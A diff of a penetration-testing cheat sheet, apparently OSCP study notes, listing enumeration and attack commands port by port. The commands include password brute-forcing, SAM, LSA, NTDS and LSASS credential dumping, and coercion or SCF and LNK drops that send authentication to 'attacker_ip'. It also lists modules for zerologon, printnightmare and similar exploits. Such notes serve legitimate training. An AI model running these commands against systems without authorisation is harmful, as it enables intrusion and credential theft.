@@ -3,136 +3,136 @@
 ### Sample Initial Nmap Scans
 
 1. Full TCP port scan:  
-   `nmap -p- -T4 --open -oN allports <target>`
+   `nmap -p- -T4 --open -oN allports $IP`
 
 2. Service/version/script scan:  
-   `nmap -sCV -p<discovered_ports> -oN targeted <target>`
+   `nmap -sCV -p<discovered_ports> -oN targeted $IP`
 
 3. UDP common ports:  
-   `sudo nmap -sU -p 53,67,68,69,111,123,137,138,139,161,162,445,500,514,1900,5353 -oN udp <target>`
+   `sudo nmap -sU -p 53,67,68,69,111,123,137,138,139,161,162,445,500,514,1900,5353 -oN udp $IP`
 
 ### Port/Service Enumeration (Windows-Focused, OSCP-Compliant)
 
 - **21/TCP - FTP** (info disclosure, unauthorized access, file upload/download):  
   `View NetExec Notes for enumeration
-  `nc -nv <target> 21` (banner; pre-installed).  
-  `telnet <target> 21` (VRFY/USER enum; pre-installed).  
-  `ftp <target>` (anon login: user anonymous, pass blank/email; pre-installed).  
-  `nmap -sV --script=ftp-anon,ftp-brute,ftp-syst <target> -p21` (pre-installed).  
-  `lftp <target>` (advanced anon browsing if needed; pre-installed).  
-  `ftp <target>` (implied manual/anon check).
+  `nc -nv $IP 21` (banner; pre-installed).  
+  `telnet $IP 21` (VRFY/USER enum; pre-installed).  
+  `ftp $IP` (anon login: user anonymous, pass blank/email; pre-installed).  
+  `nmap -sV --script=ftp-anon,ftp-brute,ftp-syst $IP -p21` (pre-installed).  
+  `lftp $IP` (advanced anon browsing if needed; pre-installed).  
+  `ftp $IP` (implied manual/anon check).
 
 - **22/TCP - SSH** (info disclosure, brute force, RCE via creds):  
   `View NetExec Notes for enumeration
-  `ssh -V <target>` (version; pre-installed).  
-  `hydra -l <user> -P <wordlist> <target> ssh` (brute; pre-installed).  
-  `nmap -sV --script=ssh2-enum-algos,ssh-hostkey <target> -p22` (pre-installed).  
-  `medusa -h <target> -u <user> -P <wordlist> -M ssh` (alt brute; pre-installed).  
-  `ssh-audit <target>` (policy scan; install via `apt install ssh-audit`). 
-  `nxc ssh <target> -u user -p pass -x 'whoami'  `
+  `ssh -V $IP` (version; pre-installed).  
+  `hydra -l <user> -P <wordlist> $IP ssh` (brute; pre-installed).  
+  `nmap -sV --script=ssh2-enum-algos,ssh-hostkey $IP -p22` (pre-installed).  
+  `medusa -h $IP -u <user> -P <wordlist> -M ssh` (alt brute; pre-installed).  
+  `ssh-audit $IP` (policy scan; install via `apt install ssh-audit`). 
+  `nxc ssh $IP -u user -p pass -x 'whoami'  `
 
 - **23/TCP - Telnet** (info disclosure, brute force, cleartext creds capture):  
-  `telnet <target> 23` (banner/login; pre-installed).  
-  `nc -nv <target> 23` (manual connect; pre-installed).  
-  `nmap -sV --script=telnet-encryption,telnet-ntlm-info <target> -p23` (pre-installed).  
-  `hydra -l <user> -P <wordlist> <target> telnet` (brute; pre-installed).
+  `telnet $IP 23` (banner/login; pre-installed).  
+  `nc -nv $IP 23` (manual connect; pre-installed).  
+  `nmap -sV --script=telnet-encryption,telnet-ntlm-info $IP -p23` (pre-installed).  
+  `hydra -l <user> -P <wordlist> $IP telnet` (brute; pre-installed).
 
 - **25/TCP - SMTP** (user enumeration, info disclosure, open relay abuse):  
-  `telnet <target> 25` (VRFY/EXPN <user>; pre-installed).  
-  `nc -nv <target> 25` (HELO/MAIL FROM; pre-installed).  
-  `nmap -sV --script=smtp-enum-users,smtp-open-relay <target> -p25` (pre-installed).  
-  `smtp-user-enum -M VRFY -U <wordlist> -t <target>` (install via `apt install smtp-user-enum`).  
-  `swaks --to <user> --from test --server <target>` (relay test; install via `apt install swaks`).
+  `telnet $IP 25` (VRFY/EXPN <user>; pre-installed).  
+  `nc -nv $IP 25` (HELO/MAIL FROM; pre-installed).  
+  `nmap -sV --script=smtp-enum-users,smtp-open-relay $IP -p25` (pre-installed).  
+  `smtp-user-enum -M VRFY -U <wordlist> -t $IP` (install via `apt install smtp-user-enum`).  
+  `swaks --to <user> --from test --server $IP` (relay test; install via `apt install swaks`).
 
 - **53/TCP/UDP - DNS** (info disclosure, zone transfer, cache poisoning):  
-  `dig @<target> axfr <domain>` (zone transfer; pre-installed).  
+  `dig @$IP axfr <domain>` (zone transfer; pre-installed).  
   `dnsrecon -d <domain> -D /usr/share/wordlists/dnsmap.txt -t std -a` (install via `apt install dnsrecon`).  
-  `nmap -sU --script=dns-zone-xfer,dns-nsec-enum <target> -p53` (pre-installed).  
-  `host -l <domain> <target>` (alt zone xfer; pre-installed).  
+  `nmap -sU --script=dns-zone-xfer,dns-nsec-enum $IP -p53` (pre-installed).  
+  `host -l <domain> $IP` (alt zone xfer; pre-installed).  
   `fierce -dns <domain>` (brute; install via `apt install fierce`).
 
 - **69/UDP - TFTP** (unauthorized access, file upload/download, info disclosure):  
-  `tftp <target>` (GET/PUT files like boot.ini; pre-installed).  
-  `nmap -sU --script=tftp-enum <target> -p69` (pre-installed).  
-  `atftp <target>` (alt client for file ops; install via `apt install atftp`).
+  `tftp $IP` (GET/PUT files like boot.ini; pre-installed).  
+  `nmap -sU --script=tftp-enum $IP -p69` (pre-installed).  
+  `atftp $IP` (alt client for file ops; install via `apt install atftp`).
 
 - **80/TCP - HTTP** (info disclosure, directory traversal, RCE via web vulns):  
-  `curl -I <target>` (headers; pre-installed).  
-  `nikto -h <target>` (pre-installed).  
-  `dirb http://<target> /usr/share/wordlists/dirb/common.txt` (pre-installed).  
-  `nmap -sV --script=http-enum,http-title,http-methods <target> -p80` (pre-installed).  
+  `curl -I $IP` (headers; pre-installed).  
+  `nikto -h $IP` (pre-installed).  
+  `dirb http://$IP /usr/share/wordlists/dirb/common.txt` (pre-installed).  
+  `nmap -sV --script=http-enum,http-title,http-methods $IP -p80` (pre-installed).  
   Browser inspection for IIS version/cookies (manual via Firefox/Chrome; pre-installed).  
-  `gobuster dir -u http://<target> -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt` (faster dir brute; pre-installed).  
-  `whatweb <target>` (fingerprint; pre-installed).  
-  `wpscan --url http://<target>` (if WP suspected; pre-installed).  
-  `feroxbuster -u http://<target> -t 10 -x txt,html,php,asp,aspx,jsp` (dir brute; pre-installed).  
-  `nikto -h <target>` (vuln scan).  
-  `whatweb <target>` (fingerprint).  
-  `curl <target>/` (robots.txt, etc.).  
-  Alt dir tools like `dirsearch -u http://<target> -r -t 50` (install via git), `ffuf -H "Host: FUZZ.<domain>" -u http://<target> -w <wordlist>` (pre-installed).
+  `gobuster dir -u http://$IP -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt` (faster dir brute; pre-installed).  
+  `whatweb $IP` (fingerprint; pre-installed).  
+  `wpscan --url http://$IP` (if WP suspected; pre-installed).  
+  `feroxbuster -u http://$IP -t 10 -x txt,html,php,asp,aspx,jsp` (dir brute; pre-installed).  
+  `nikto -h $IP` (vuln scan).  
+  `whatweb $IP` (fingerprint).  
+  `curl $IP/` (robots.txt, etc.).  
+  Alt dir tools like `dirsearch -u http://$IP -r -t 50` (install via git), `ffuf -H "Host: FUZZ.<domain>" -u http://$IP -w <wordlist>` (pre-installed).
 
 - **88/TCP - Kerberos** (user enumeration, AS-REP roasting, ticket forging):  
-  `nmap -sV --script=krb5-enum-users --script-args krb5-enum-users.realm=<domain> <target> -p88` (pre-installed).  
+  `nmap -sV --script=krb5-enum-users --script-args krb5-enum-users.realm=<domain> $IP -p88` (pre-installed).  
   `GetNPUsers.py <domain>/ -usersfile <users.txt> -format hashcat` (Impacket; install via `apt install impacket-scripts` or `pip install impacket`).  
-  `kerbrute userenum --dc <target> -d <domain> <users.txt>` (install via `go install github.com/ropnop/kerbrute@latest` or binary download).
+  `kerbrute userenum --dc $IP -d <domain> <users.txt>` (install via `go install github.com/ropnop/kerbrute@latest` or binary download).
 
 - **110/TCP - POP3** (brute force, info disclosure, mail retrieval):  
-  `telnet <target> 110` (USER/PASS; pre-installed).  
-  `nc -nv <target> 110` (LIST/RETR; pre-installed).  
-  `nmap -sV --script=pop3-capabilities,pop3-ntlm-info <target> -p110` (pre-installed).  
-  `hydra -l <user> -P <wordlist> <target> pop3` (brute; pre-installed).
+  `telnet $IP 110` (USER/PASS; pre-installed).  
+  `nc -nv $IP 110` (LIST/RETR; pre-installed).  
+  `nmap -sV --script=pop3-capabilities,pop3-ntlm-info $IP -p110` (pre-installed).  
+  `hydra -l <user> -P <wordlist> $IP pop3` (brute; pre-installed).
 
 - **111/TCP/UDP - RPCBIND** (info disclosure, port mapping, service enumeration):  
-  `rpcinfo -p <target>` (pre-installed).  
-  `nmap -sV --script=rpcinfo <target> -p111` (pre-installed).  
-  `rpcgrind -p <target>` (if deeper; part of rpcbind, pre-installed).
+  `rpcinfo -p $IP` (pre-installed).  
+  `nmap -sV --script=rpcinfo $IP -p111` (pre-installed).  
+  `rpcgrind -p $IP` (if deeper; part of rpcbind, pre-installed).
 
 - **135/TCP - MSRPC** (info disclosure, user enumeration, endpoint mapping):  
-  `rpcclient -U "" <target>` (null session, enumdomusers; pre-installed).  
-  `nmap -sV --script=msrpc-enum <target> -p135` (pre-installed).  
-  `impacket-rpcdump <target>` (endpoint dump; Impacket install as above).
+  `rpcclient -U "" $IP` (null session, enumdomusers; pre-installed).  
+  `nmap -sV --script=msrpc-enum $IP -p135` (pre-installed).  
+  `impacket-rpcdump $IP` (endpoint dump; Impacket install as above).
   WMI exec / query:  
   `View NetExec Notes for wmi enumeration
-  `nxc wmi <target> -u user -p pass -x 'whoami'  
-  `nxc wmi <target> -u user -p pass --wmi 'SELECT * FROM Win32_ComputerSystem'
+  `nxc wmi $IP -u user -p pass -x 'whoami'  
+  `nxc wmi $IP -u user -p pass --wmi 'SELECT * FROM Win32_ComputerSystem'
 
 - **137/UDP - NetBIOS** (info disclosure, name resolution, system details):  
-  `nbtscan <target>` (pre-installed).  
-  `nmblookup -A <target>` (pre-installed).  
-  `nmap -sU --script=nbstat <target> -p137` (pre-installed).  
-  `nbtscan-unixwiz <target>/24` (range scan if needed; install via `apt install nbtscan-unixwiz`).
+  `nbtscan $IP` (pre-installed).  
+  `nmblookup -A $IP` (pre-installed).  
+  `nmap -sU --script=nbstat $IP -p137` (pre-installed).  
+  `nbtscan-unixwiz $IP/24` (range scan if needed; install via `apt install nbtscan-unixwiz`).
 
 - **139/TCP - NetBIOS/SMB** (info disclosure, share enumeration, null session access):  
   `View NetExec Notes for enumeration
-  `smbclient -L //<target>` (null session; pre-installed).  
-  `enum4linux -a <target>` (pre-installed).  
-  `nmap -sV --script=smb-enum-shares,smb-enum-users <target> -p139` (pre-installed).  
-  `smbmap -H <target>` (share enum; pre-installed).  
-  `enum4linux-ng -a <target>` (improved enum; install via git).  
-  `smbclient -L //<target>` (shares).  
-  `smbmap -H <target> -p 139` (shares).
+  `smbclient -L //$IP` (null session; pre-installed).  
+  `enum4linux -a $IP` (pre-installed).  
+  `nmap -sV --script=smb-enum-shares,smb-enum-users $IP -p139` (pre-installed).  
+  `smbmap -H $IP` (share enum; pre-installed).  
+  `enum4linux-ng -a $IP` (improved enum; install via git).  
+  `smbclient -L //$IP` (shares).  
+  `smbmap -H $IP -p 139` (shares).
 
 - **143/TCP - IMAP** (brute force, info disclosure, mail retrieval):  
-  `telnet <target> 143` (LOGIN; pre-installed).  
-  `nc -nv <target> 143` (CAPABILITY; pre-installed).  
-  `nmap -sV --script=imap-capabilities,imap-ntlm-info <target> -p143` (pre-installed).  
-  `hydra -l <user> -P <wordlist> <target> imap` (brute; pre-installed).
+  `telnet $IP 143` (LOGIN; pre-installed).  
+  `nc -nv $IP 143` (CAPABILITY; pre-installed).  
+  `nmap -sV --script=imap-capabilities,imap-ntlm-info $IP -p143` (pre-installed).  
+  `hydra -l <user> -P <wordlist> $IP imap` (brute; pre-installed).
 
 - **161/UDP - SNMP** (info disclosure, community string brute, system details):  
-  `snmpwalk -v1 -c public <target>` (pre-installed).  
-  `onesixtyone -c /usr/share/seclists/Discovery/SNMP/common-snmp-community-strings.txt <target>` (pre-installed).  
-  `nmap -sU --script=snmp-info,snmp-sysdescr <target> -p161` (pre-installed).  
-  `snmp-check <target> -c public` (detailed enum; pre-installed).  
-  `braa public@<target>:.1.3.6.*` (brute OID; install via `apt install braa`).  
-  `snmpwalk -v1 -c public <target>` (MIB walk).  
-  `onesixtyone -c <wordlist> <target>` (community brute).
+  `snmpwalk -v1 -c public $IP` (pre-installed).  
+  `onesixtyone -c /usr/share/seclists/Discovery/SNMP/common-snmp-community-strings.txt $IP` (pre-installed).  
+  `nmap -sU --script=snmp-info,snmp-sysdescr $IP -p161` (pre-installed).  
+  `snmp-check $IP -c public` (detailed enum; pre-installed).  
+  `braa public@$IP:.1.3.6.*` (brute OID; install via `apt install braa`).  
+  `snmpwalk -v1 -c public $IP` (MIB walk).  
+  `onesixtyone -c <wordlist> $IP` (community brute).
 
 - **389/TCP - LDAP** (info disclosure, user enumeration, AD details):  
   `ldapsearch -x -h <IP> -b "dc=X,dc=Y"`  Search output for usernames (Replace X & Y in command. Search for sAMAccountName in output. Look for password hints) Example ldapsearch -x -H ldap://192.168.199.122 -b "DC=hutch,DC=offsec" -s sub "(&(objectclass=user))"
-  `ldapsearch -x -H ldap://<target> -b "" -s base "(objectclass=*)"`.  
-  `nmap -sV --script=ldap-rootdse,ldap-search <target> -p389`.  
+  `ldapsearch -x -H ldap://$IP -b "" -s base "(objectclass=*)"`.  
+  `nmap -sV --script=ldap-rootdse,ldap-search $IP -p389`.  
   `enum4linux-ng <IP> -L -S -oJ output.json` -L: Get additional info via LDAP/LDAPS, -S: Get shares via RPC, -oJ: Outputs to file.  
-  `windapsearch -d <domain> --dc <target> --module users` (install via `git clone https://github.com/ropnop/windapsearch`).
+  `windapsearch -d <domain> --dc $IP --module users` (install via `git clone https://github.com/ropnop/windapsearch`).
 Basic enum (users/trusts/delegation):  
   `nxc ldap <dc> -u user -p pass --users`
   `nxc ldap <dc> -u user -p pass --trusted-for-delegation`
@@ -149,34 +149,34 @@ Common modules:
   `nxc ldap <dc> -u user -p pass -M groupmembership -o USER=username`
 
 - **443/TCP - HTTPS** (info disclosure, SSL misconfig, RCE via web vulns):  
-  `curl -k -I https://<target>` (headers; pre-installed).  
-  `nikto -h https://<target>` (pre-installed).  
-  `sslscan <target>` (pre-installed).  
-  `nmap -sV --script=ssl-enum-ciphers,http-enum <target> -p443` (pre-installed).  
-  `testssl.sh <target>` (TLS scan; pre-installed).  
-  `sslyze --regular <target>` (cert analysis; pre-installed).  
-  `feroxbuster -u https://<target> -t 10 -x txt,html,php,asp,aspx,jsp` (dir brute).  
-  `nikto -h https://<target>` (vuln scan).  
-  `whatweb https://<target>` (fingerprint).  
-  `curl https://<target>/` (robots.txt, etc.).
+  `curl -k -I https://$IP` (headers; pre-installed).  
+  `nikto -h https://$IP` (pre-installed).  
+  `sslscan $IP` (pre-installed).  
+  `nmap -sV --script=ssl-enum-ciphers,http-enum $IP -p443` (pre-installed).  
+  `testssl.sh $IP` (TLS scan; pre-installed).  
+  `sslyze --regular $IP` (cert analysis; pre-installed).  
+  `feroxbuster -u https://$IP -t 10 -x txt,html,php,asp,aspx,jsp` (dir brute).  
+  `nikto -h https://$IP` (vuln scan).  
+  `whatweb https://$IP` (fingerprint).  
+  `curl https://$IP/` (robots.txt, etc.).
 
 - **445/TCP - SMB** (info disclosure, share enumeration, brute force, RCE via vulns):  
-  `smbclient -L //<target> -N` (pre-installed).  
-  `rpcclient -U "" -N <target>` (enumprivs; pre-installed).  
-  `enum4linux -a <target>` (pre-installed).  
-  `nmap -sV --script=smb-enum-shares,smb2-security-mode <target> -p445` (pre-installed).  
-  `crackmapexec smb <target> --shares` (pre-installed).  
-  `smbmap -H <target> -u "" -p ""` (null enum; pre-installed).  
-  `impacket-smbclient guest@<target>` (Impacket install as above).  
-  `enum4linux-ng -a <target>` (AD/shares enum).  
-  `smbclient -L //<target>` (shares).  
-  `smbmap -H <target> -p 445` (shares).
-  `nxc smb <target> -u '' -p '' --shares`  
-  `nxc smb <target> -u 'guest' -p '' --shares`
+  `smbclient -L //$IP -N` (pre-installed).  
+  `rpcclient -U "" -N $IP` (enumprivs; pre-installed).  
+  `enum4linux -a $IP` (pre-installed).  
+  `nmap -sV --script=smb-enum-shares,smb2-security-mode $IP -p445` (pre-installed).  
+  `crackmapexec smb $IP --shares` (pre-installed).  
+  `smbmap -H $IP -u "" -p ""` (null enum; pre-installed).  
+  `impacket-smbclient guest@$IP` (Impacket install as above).  
+  `enum4linux-ng -a $IP` (AD/shares enum).  
+  `smbclient -L //$IP` (shares).  
+  `smbmap -H $IP -p 445` (shares).
+  `nxc smb $IP -u '' -p '' --shares`  
+  `nxc smb $IP -u 'guest' -p '' --shares`
 Creds shares + access:  
-  `nxc smb <target> -u user -p pass --shares`
+  `nxc smb $IP -u user -p pass --shares`
 RID brute (no creds sometimes):  
-  `nxc smb <target> --rid-brute (or with -u -p)`
+  `nxc smb $IP --rid-brute (or with -u -p)`
 Domain enum (users/groups/computers/policy/sessions/loggedon):  
   `nxc smb <dc> -u user -p pass --users`
   `nxc smb <dc> -u user -p pass --groups`  
@@ -186,165 +186,165 @@ Domain enum (users/groups/computers/policy/sessions/loggedon):
   `nxc smb <dc> -u user -p pass --loggedon-users`  
   `nxc smb <dc> -u user -p pass --disks`
 Dumps:  
-  `nxc smb <target> -u user -p pass --sam`  
-  `nxc smb <target> -u user -p pass --lsa`  
-  `nxc smb <target> -u user -p pass --ntds` (drsuapi default)  
-  `nxc smb <target> -u user -p pass --ntds vss`  
-  `nxc smb <target> -u user -p pass --dpapi`
+  `nxc smb $IP -u user -p pass --sam`  
+  `nxc smb $IP -u user -p pass --lsa`  
+  `nxc smb $IP -u user -p pass --ntds` (drsuapi default)  
+  `nxc smb $IP -u user -p pass --ntds vss`  
+  `nxc smb $IP -u user -p pass --dpapi`
 BloodHound collection:  
-  `nxc smb <target> -u user -p pass --bloodhound -c all`
+  `nxc smb $IP -u user -p pass --bloodhound -c all`
 Relay sig check + list:  
   `nxc smb 192.168.1.0/24 --gen-relay-list relay.txt`
 Vulns / coerce:  
-  `nxc smb <target> -M zerologon`  
-  `nxc smb <target> -M petitpotam`  
-  `nxc smb <target> -M nopac`  
-  `nxc smb <target> -M printnightmare`  
-  `nxc smb <target> -M coerce_plus -o LISTENER=attacker_ip`
+  `nxc smb $IP -M zerologon`  
+  `nxc smb $IP -M petitpotam`  
+  `nxc smb $IP -M nopac`  
+  `nxc smb $IP -M printnightmare`  
+  `nxc smb $IP -M coerce_plus -o LISTENER=attacker_ip`
 Spider/download files:  
-  `nxc smb <target> -u user -p pass -M spider_plus`  
-  `nxc smb <target> -u user -p pass -M spider_plus -o READ_ONLY=False DOWNLOAD_FLAG=True`
+  `nxc smb $IP -u user -p pass -M spider_plus`  
+  `nxc smb $IP -u user -p pass -M spider_plus -o READ_ONLY=False DOWNLOAD_FLAG=True`
 LSASS dumps (modules):  
-  `nxc smb <target> -u user -p pass -M lsassy`  
-  `nxc smb <target> -u user -p pass -M nanodump`  
-  `nxc smb <target> -u user -p pass -M procdump`
+  `nxc smb $IP -u user -p pass -M lsassy`  
+  `nxc smb $IP -u user -p pass -M nanodump`  
+  `nxc smb $IP -u user -p pass -M procdump`
 Other modules:  
-  `nxc smb <target> -u user -p pass -M enum_av` (AV/EDR)  
-  `nxc smb <target> -u user -p pass -M rdp -o ENABLE=true` (enable RDP)  
-  `nxc smb <target> -u user -p pass -M slinky -o SERVER=attacker_ip NAME=file.lnk` (create symlink)  
-  `nxc smb <target> -u user -p pass -M scuffy -o SERVER=attacker_ip NAME=file.scf`  
-  `nxc smb <target> -u user -p pass -M enum_dns` (DNS via WMI)  
-  `nxc smb <target> -u user -p pass -M get_netconnections` (network conns)  
-  `nxc smb <target> -u user -p pass -M backup_operator` (NTDS dump via backup)  
-  `nxc smb <target> -u user -p pass -M ntdsutil` (NTDS via ntdsutil)`
+  `nxc smb $IP -u user -p pass -M enum_av` (AV/EDR)  
+  `nxc smb $IP -u user -p pass -M rdp -o ENABLE=true` (enable RDP)  
+  `nxc smb $IP -u user -p pass -M slinky -o SERVER=attacker_ip NAME=file.lnk` (create symlink)  
+  `nxc smb $IP -u user -p pass -M scuffy -o SERVER=attacker_ip NAME=file.scf`  
+  `nxc smb $IP -u user -p pass -M enum_dns` (DNS via WMI)  
+  `nxc smb $IP -u user -p pass -M get_netconnections` (network conns)  
+  `nxc smb $IP -u user -p pass -M backup_operator` (NTDS dump via backup)  
+  `nxc smb $IP -u user -p pass -M ntdsutil` (NTDS via ntdsutil)`
 
 - **464/TCP - Kerberos Password Change** (user enumeration, password spraying, ticket abuse):  
-  `nmap -sV --script=krb5-enum-users <target> -p464` (pre-installed).  
-  `GetUserSPNs.py <domain>/ -dc-ip <target>` (Impacket; install as above).
+  `nmap -sV --script=krb5-enum-users $IP -p464` (pre-installed).  
+  `GetUserSPNs.py <domain>/ -dc-ip $IP` (Impacket; install as above).
 
 - **636/TCP - LDAPS** (info disclosure, secure AD enum, misconfig exploitation):  
-  `ldapsearch -x -H ldaps://<target> -b ""` (pre-installed).  
-  `nmap -sV --script=ldap-rootdse <target> -p636` (pre-installed).  
-  `openssl s_client -connect <target>:636` (cert check; pre-installed).
+  `ldapsearch -x -H ldaps://$IP -b ""` (pre-installed).  
+  `nmap -sV --script=ldap-rootdse $IP -p636` (pre-installed).  
+  `openssl s_client -connect $IP:636` (cert check; pre-installed).
 
 - **995/TCP - POP3S** (brute force, info disclosure, secure mail retrieval):  
-  `openssl s_client -connect <target>:995` (banner; pre-installed).  
-  `nmap -sV --script=pop3-capabilities <target> -p995` (pre-installed).  
-  `curl -k --user <user>:<pass> pop3s://<target>` (test; pre-installed).
+  `openssl s_client -connect $IP:995` (banner; pre-installed).  
+  `nmap -sV --script=pop3-capabilities $IP -p995` (pre-installed).  
+  `curl -k --user <user>:<pass> pop3s://$IP` (test; pre-installed).
 
 - **993/TCP - IMAPS** (brute force, info disclosure, secure mail retrieval):  
-  `openssl s_client -connect <target>:993` (pre-installed).  
-  `nmap -sV --script=imap-capabilities <target> -p993` (pre-installed).  
-  `curl -k --user <user>:<pass> imaps://<target>` (test; pre-installed).
+  `openssl s_client -connect $IP:993` (pre-installed).  
+  `nmap -sV --script=imap-capabilities $IP -p993` (pre-installed).  
+  `curl -k --user <user>:<pass> imaps://$IP` (test; pre-installed).
 
 - **1433/TCP - MSSQL** (info disclosure, brute force, SQL injection): 
   `View NetExec Notes for enumeration
-  `sqsh -S <target> -U sa` (if creds; install via `apt install sqsh`).  
-  `nmap -sV --script=ms-sql-info,ms-sql-ntlm-info <target> -p1433` (pre-installed).  
-  `impacket-mssqlclient <user>@<target>` (Impacket install as above).  
-  `hydra -l sa -P <wordlist> <target> mssql` (brute; pre-installed).
-  `nxc mssql <target> -u user -p pass -q 'SELECT @@VERSION' (get version)`
+  `sqsh -S $IP -U sa` (if creds; install via `apt install sqsh`).  
+  `nmap -sV --script=ms-sql-info,ms-sql-ntlm-info $IP -p1433` (pre-installed).  
+  `impacket-mssqlclient <user>@$IP` (Impacket install as above).  
+  `hydra -l sa -P <wordlist> $IP mssql` (brute; pre-installed).
+  `nxc mssql $IP -u user -p pass -q 'SELECT @@VERSION' (get version)`
   Enable & use xp_cmdshell:  
-  `nxc mssql <target> -u user -p pass --enable-xp`  
-  `nxc mssql <target> -u user -p pass -X 'whoami'  (after enable)`
+  `nxc mssql $IP -u user -p pass --enable-xp`  
+  `nxc mssql $IP -u user -p pass -X 'whoami'  (after enable)`
   Priv esc / link:  
   `nxc mssql -M mssql_priv --options (view options for netexecs mssql_priv module )
-  `nxc mssql <target> -u user -p pass -M mssql_priv -o ACTION=enum/escalate/link TARGET=other_sql`  (Use cautiously in OSCP—escalate/link can trigger detections or require prior enum.) NetExec MSSQL priv module: enum current privs/paths, escalate (e.g., impersonate sa, enable xp_cmdshell), or link/query remote servers for lateral.
+  `nxc mssql $IP -u user -p pass -M mssql_priv -o ACTION=enum/escalate/link TARGET=other_sql`  (Use cautiously in OSCP—escalate/link can trigger detections or require prior enum.) NetExec MSSQL priv module: enum current privs/paths, escalate (e.g., impersonate sa, enable xp_cmdshell), or link/query remote servers for lateral.
 
 - **1521/TCP - Oracle** (info disclosure, SID brute, TNS poisoning):  
-  `tnscmd10g version -h <target>` (install via `git clone https://github.com/irsdl/tnscmd10g`).  
-  `odat.py all -s <target>` (install via `git clone https://github.com/quentinhardy/odat`).  
-  `nmap -sV --script=oracle-sid-brute <target> -p1521` (pre-installed).  
-  `oscanner -s <target>` (install via `apt install oscanner`).  
-  `tnscmd10g version -h <target>` (TNS enum).
+  `tnscmd10g version -h $IP` (install via `git clone https://github.com/irsdl/tnscmd10g`).  
+  `odat.py all -s $IP` (install via `git clone https://github.com/quentinhardy/odat`).  
+  `nmap -sV --script=oracle-sid-brute $IP -p1521` (pre-installed).  
+  `oscanner -s $IP` (install via `apt install oscanner`).  
+  `tnscmd10g version -h $IP` (TNS enum).
 
 - **2049/TCP - NFS** (info disclosure, unauthorized mount, file access):  
   `View NetExec Notes for enumeration
-  `showmount -e <target>` (pre-installed).  
-  `nfsstat -m <target>` (install via `apt install nfs-common`).  
-  `nmap -sV --script=nfs-showmount <target> -p2049` (pre-installed).  
-  `rpcinfo -p <target> | grep nfs` (pre-installed).
+  `showmount -e $IP` (pre-installed).  
+  `nfsstat -m $IP` (install via `apt install nfs-common`).  
+  `nmap -sV --script=nfs-showmount $IP -p2049` (pre-installed).  
+  `rpcinfo -p $IP | grep nfs` (pre-installed).
 
 - **3306/TCP - MySQL** (info disclosure, brute force, SQL injection):  
-  `mysql -h <target> -u root -p` (test default; pre-installed).  
-  `nmap -sV --script=mysql-info,mysql-users <target> -p3306` (pre-installed).  
-  `hydra -l root -P <wordlist> <target> mysql` (brute; pre-installed).  
-  `mysqloit -h <target>` (if vuln check; part of sqlmap, pre-installed).  
+  `mysql -h $IP -u root -p` (test default; pre-installed).  
+  `nmap -sV --script=mysql-info,mysql-users $IP -p3306` (pre-installed).  
+  `hydra -l root -P <wordlist> $IP mysql` (brute; pre-installed).  
+  `mysqloit -h $IP` (if vuln check; part of sqlmap, pre-installed).  
 
 - **3389/TCP - RDP** (brute force, RCE via creds, session hijacking):  
   `View NetExec Notes for enumeration
-  `rdesktop -u <user> -p <pass> <target>` (pre-installed).  
-  `hydra -l <user> -P <wordlist> <target> rdp` (pre-installed).  
-  `nmap -sV --script=rdp-enum-encryption <target> -p3389` (pre-installed).  
-  `xfreerdp /u:<user> /p:<pass> /v:<target>` (alt client; pre-installed).  
-  `crowbar -b rdp -u <user> -C <wordlist> -t <target>` (brute; pre-installed).  
+  `rdesktop -u <user> -p <pass> $IP` (pre-installed).  
+  `hydra -l <user> -P <wordlist> $IP rdp` (pre-installed).  
+  `nmap -sV --script=rdp-enum-encryption $IP -p3389` (pre-installed).  
+  `xfreerdp /u:<user> /p:<pass> /v:$IP` (alt client; pre-installed).  
+  `crowbar -b rdp -u <user> -C <wordlist> -t $IP` (brute; pre-installed).  
 
 - **5432/TCP - PostgreSQL** (info disclosure, brute force, SQL injection):  
-  `psql -h <target> -U postgres` (pre-installed).  
-  `nmap -sV --script=pgsql-brute <target> -p5432` (pre-installed).  
-  `hydra -l postgres -P <wordlist> <target> postgres` (brute; pre-installed).  
+  `psql -h $IP -U postgres` (pre-installed).  
+  `nmap -sV --script=pgsql-brute $IP -p5432` (pre-installed).  
+  `hydra -l postgres -P <wordlist> $IP postgres` (brute; pre-installed).  
 
 - **5900/TCP - VNC** (brute force, unauthorized access, RCE via viewer):  
   `View NetExec Notes for enumeration
-  `nxc vnc <target> -u user -p pass
-  `vncviewer <target>:5900` (pre-installed).  
-  `nmap -sV --script=vnc-info <target> -p5900` (pre-installed).  
-  `hydra -P <wordlist> <target> vnc` (brute, no user needed; pre-installed).
+  `nxc vnc $IP -u user -p pass
+  `vncviewer $IP:5900` (pre-installed).  
+  `nmap -sV --script=vnc-info $IP -p5900` (pre-installed).  
+  `hydra -P <wordlist> $IP vnc` (brute, no user needed; pre-installed).
 
 - **5985/TCP - WinRM** (info disclosure, brute force, RCE via creds): 
   `View NetExec Notes for enumeration
-  `crackmapexec winrm <target> -u <user> -p <pass>` (pre-installed).  
-  `evil-winrm -i <target> -u <user> -p <pass>` (install via `gem install evil-winrm`).  
-  `nmap -sV --script=wsman-enum <target> -p5985` (pre-installed).  
-  `winrm -u:<user> -p:<pass> <target>` (ruby-based; pre-installed if ruby).
+  `crackmapexec winrm $IP -u <user> -p <pass>` (pre-installed).  
+  `evil-winrm -i $IP -u <user> -p <pass>` (install via `gem install evil-winrm`).  
+  `nmap -sV --script=wsman-enum $IP -p5985` (pre-installed).  
+  `winrm -u:<user> -p:<pass> $IP` (ruby-based; pre-installed if ruby).
 
 - **5986/TCP - WinRM (HTTPS)** (info disclosure, brute force, RCE via creds):  
   Similar to 5985; add --ssl to tools (e.g., evil-winrm --ssl).  
-  `nmap -sV --script=wsman-enum <target> -p5986` (pre-installed).
+  `nmap -sV --script=wsman-enum $IP -p5986` (pre-installed).
 
 - **8080/TCP - HTTP Alternate** (info disclosure, directory traversal, RCE via web vulns):  
-  Same as 80; `curl -I http://<target>:8080` (pre-installed).  
-  `nikto -h http://<target>:8080` (pre-installed).  
-  `nmap -sV --script=http-enum <target> -p8080` (pre-installed).  
-  `gobuster dir -u http://<target>:8080 -w <wordlist>` (pre-installed).  
+  Same as 80; `curl -I http://$IP:8080` (pre-installed).  
+  `nikto -h http://$IP:8080` (pre-installed).  
+  `nmap -sV --script=http-enum $IP -p8080` (pre-installed).  
+  `gobuster dir -u http://$IP:8080 -w <wordlist>` (pre-installed).  
 
